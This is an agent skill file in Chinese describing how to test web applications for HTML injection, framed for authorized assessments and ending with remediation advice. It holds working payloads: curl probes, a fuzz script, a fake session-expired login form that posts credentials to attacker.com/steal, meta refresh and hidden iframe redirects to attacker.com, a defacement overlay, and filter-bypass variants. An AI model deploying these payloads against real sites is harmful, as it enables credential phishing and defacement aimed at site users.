---
name: html-injection-testing
title: HTML 注入测试
description: 当对授权 Web 目标做应用安全测试、需识别用户输入未经转义直接渲染导致的 HTML 注入时使用；做注入点定位、payload 构造与利用（钓鱼表单/篡改/重定向）并产出漏洞报告与修复建议；不适用于未授权目标、纯 JS 执行型 XSS 深挖或前端渲染调试。触发词：HTML 注入、HTML injection、钓鱼表单、页面篡改、输出转义
domain: 安全/appsec
triggers: [HTML 注入, HTML injection, 钓鱼表单注入, 页面篡改 defacement, 反射型/存储型 HTML 注入, 输出未转义, meta refresh 重定向注入]
tags: [安全, appsec, web安全, 注入, 渗透测试, 钓鱼, XSS相关]
level: 进阶
status: stable
agents: [claude-code, codex, cursor, gemini-cli]
tools: [curl, Burp Suite, OWASP ZAP, 浏览器开发者工具, Python requests]
requires: []
related: [path-traversal-testing, idor-vulnerability-testing, broken-authentication-testing, burp-suite-testing]
combines_with: [burp-suite-testing, penetration-testing-methodology, api-fuzzing-bug-bounty]
license: MIT
source: sickn33/antigravity-awesome-skills
source_license: MIT
---
> 仅限授权使用：仅在获得授权的安全评估、防御验证或受控教学环境中使用本技能。

## 何时使用

当你在**已获授权**的 Web 应用上做应用安全测试，怀疑用户输入被未经清洗/转义地反射或存储到页面 HTML 中，需要确认是否存在 HTML 注入并评估其危害（篡改、钓鱼、凭据窃取）时使用。

先分清 HTML 注入与 XSS：
- HTML 注入：只渲染 HTML 标签（如 `<h1>`、`<form>`、`<img>`），不执行脚本。
- XSS：可执行 JavaScript。
- HTML 注入常是通往 XSS 的跳板；即便脚本被过滤，仍可借表单/`meta refresh` 实施钓鱼。

**不该用边界**：
- 未取得书面授权的任何目标——不要碰。
- 目标已确认存在脚本执行（纯 XSS 利用/绕过 CSP 执行 JS）应转向 XSS 专项，本技能聚焦标签渲染层面。
- 仅排查自家前端渲染 bug、与安全无关，无需本流程。

## 步骤

1. **定位注入点**：盘点会回显输入的位置——搜索框与结果、评论区、用户资料、联系/反馈/注册表单、被回显的 URL 参数、错误消息、页面标题、隐藏字段、被回显的 Cookie。
   常见可疑参数：`name`、`user`、`search`、`query`、`message`、`title`、`content`、`redirect`、`url`、`page`。
2. **基础探测**：注入简单标签，确认是否被当作 HTML 渲染而非转义文本。
3. **判定注入类型**：存储型（入库持久化）/ 反射型 GET（URL 参数）/ 反射型 POST（表单体）/ URL 路径回显型。
4. **构造利用**：按目标场景构造钓鱼表单、页面篡改覆盖层，或 CSS/meta/iframe/表单 action 等进阶 payload。
5. **绕过过滤**：遇到过滤时尝试大小写变形、HTML 实体/URL/双重/Unicode 编码、标签拆分、空字节、属性事件等。
6. **批量/自动化**：用 Burp Intruder、ZAP 主动扫描或自写 fuzz 脚本扩大覆盖，再**人工验证**每个命中。
7. **出报告**：注入点清单、利用证据（内容被操纵的截图/响应）、危害评估（钓鱼/篡改/凭据窃取）、修复建议。

## 指令

基础渲染探测（确认 HTML 是否被渲染，而非以转义文本回显）：

```bash
# 基本注入
curl "http://target.com/search?q=<h1>Test</h1>"
# 检查响应中是否渲染了 HTML
curl -s "http://target.com/search?q=<b>Bold</b>" | grep -i "bold"
# URL 编码形式
curl "http://target.com/search?q=%3Ch1%3ETest%3C%2Fh1%3E"
```

反射型 POST 探测：

```bash
curl -X POST -d "comment=<div style='color:red'>Malicious Content</div>" http://target.com/submit
```

简单 fuzz 脚本（命中后必须人工复核）：

```python
#!/usr/bin/env python3
import requests, urllib.parse
target, param = "http://target.com/search", "q"
payloads = [
    "<h1>Test</h1>", "<b>Bold</b>", "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>", "<a href='http://evil.com'>Click</a>",
    "<div style='color:red'>Styled</div>", "<marquee>Moving</marquee>",
    "<iframe src='http://evil.com'></iframe>",
]
for p in payloads:
    url = f"{target}?{param}={urllib.parse.quote(p)}"
    try:
        r = requests.get(url, timeout=5)
        if p.lower() in r.text.lower():
            print(f"[+] Possible injection: {p}")
        elif "<h1>" in r.text or "<b>" in r.text:
            print(f"[?] Partial reflection: {p}")
    except Exception as e:
        print(f"[-] Error: {e}")
```

自动化扫描器：
- Burp：抓含注入点的请求 → Send to Intruder → 标记参数为 payload 位 → 载入 HTML 注入字典 → 跑 → 过滤已渲染 HTML 的响应 → 人工验证。
- ZAP：Spider 爬取 → 用 HTML 注入规则做 Active Scan → 复核 Alerts → 人工验证。

## 示例

基础渲染测试 payload：

```html
<h1>Test Injection</h1>
<b>Bold Text</b>
<div style="background:red;color:white;padding:10px">Injected DIV</div>
<a href="http://attacker.com">Click Here</a>
<img src="http://attacker.com/image.png">
```

存储型钓鱼表单（如注入到评论/资料 bio，伪造会话过期登录框）：

```html
<form action="http://attacker.com/steal" method="POST">
    <input name="username" placeholder="Session expired. Enter username:">
    <input name="password" type="password" placeholder="Password:">
    <input type="submit" value="Login">
</form>
```

反射型 GET（URL 参数）：

```text
http://target.com/search?q=<marquee>Your%20account%20has%20been%20compromised</marquee>
```

页面篡改（全屏覆盖层）：

```html
<div style="position:fixed;top:0;left:0;width:100%;height:100%;
            background:#000;color:#0f0;z-index:9999;
            display:flex;justify-content:center;align-items:center;">
    <h1>HACKED BY SECURITY TESTER</h1>
</div>
```

进阶：meta refresh 重定向 / iframe 注入：

```html
<meta http-equiv="refresh" content="0;url=http://attacker.com/phish">
<iframe src="http://attacker.com/track" style="display:none"></iframe>
```

过滤绕过样例：

```html
<H1>Test</H1>                          <!-- 大小写变形 -->
&#60;h1&#62;Encoded&#60;/h1&#62;        <!-- HTML 实体 -->
%253Ch1%253EDouble%253C%252Fh1%253E    <!-- 双重编码 -->
<h
1>Split Tag</h1>                       <!-- 标签拆分 -->
<div onmouseover="alert(1)">Hover</div> <!-- 属性事件 -->
```

## 注意事项

- **授权第一**：无授权不测试，所有 payload 仅指向你掌控的回收端点（如 `attacker.com` 占位需替换为自己的测试服务器）。
- **区分 HTML 注入与 XSS**：在浏览器中实测视觉影响，确认是「标签被渲染」还是「脚本被执行」，并据此定级与撰写报告。
- **危害定级**：HTML 注入本身严重度低于 XSS（无脚本执行），但结合钓鱼/页面篡改可显著放大——评估凭据窃取与声誉损害。
- **现实限制**：现代浏览器可能净化部分注入；CSP 可拦内联样式/脚本；WAF 可能拦常见 payload；输出做了正确转义则不可注入。
- **排错**：HTML 未渲染→检查是否被 HTML 编码、换编码变体、确认注入上下文；payload 被剥离→试编码变体/标签拆分/空字节/嵌套标签；HTML 通但 JS 不通→转用钓鱼表单与 meta refresh 重定向。
- **修复建议**（写入报告）：输出做上下文感知转义（PHP `htmlspecialchars($x, ENT_QUOTES, 'UTF-8')` 或 `strip_tags`；Python `html.escape`，Jinja2 默认自动转义、慎用 `| safe`；JS 用 `textContent` 而非 `innerHTML`，必须富文本则 `DOMPurify.sanitize`）；辅以输入白名单校验、CSP 头、WAF 规则。

## 互见

- XSS 测试（脚本执行型注入，HTML 注入的进阶方向）
- CSP 配置与绕过
- 输入校验与输出编码（防御侧）

---
采编自 sickn33/antigravity-awesome-skills（MIT），原作者 zebbern。
